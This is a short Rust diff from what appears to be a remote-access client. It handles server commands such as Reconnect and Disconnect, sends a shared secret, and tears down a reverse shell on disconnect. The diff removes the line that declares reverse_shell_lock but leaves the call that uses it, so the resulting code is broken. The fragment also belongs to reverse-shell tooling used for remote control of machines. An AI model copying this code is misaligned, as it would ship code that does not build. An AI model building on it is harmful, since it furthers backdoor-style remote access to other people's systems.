@@ -52,11 +52,11 @@ pub fn handle_server(
                         client_info(&mut write_stream, &Some(SECRET.lock().unwrap().to_vec()));
                     }
                     Command::Reconnect => {
+                        *crate::SECRET_INITIALIZED.lock().unwrap() = false;
                         *is_connected.lock().unwrap() = false;
                         break;
                     }
                     Command::Disconnect => {
-                        let mut reverse_shell_lock = REVERSE_SHELL.lock().unwrap();
                         reverse_shell_lock.exit_shell();
                         process::exit(1);
                     }
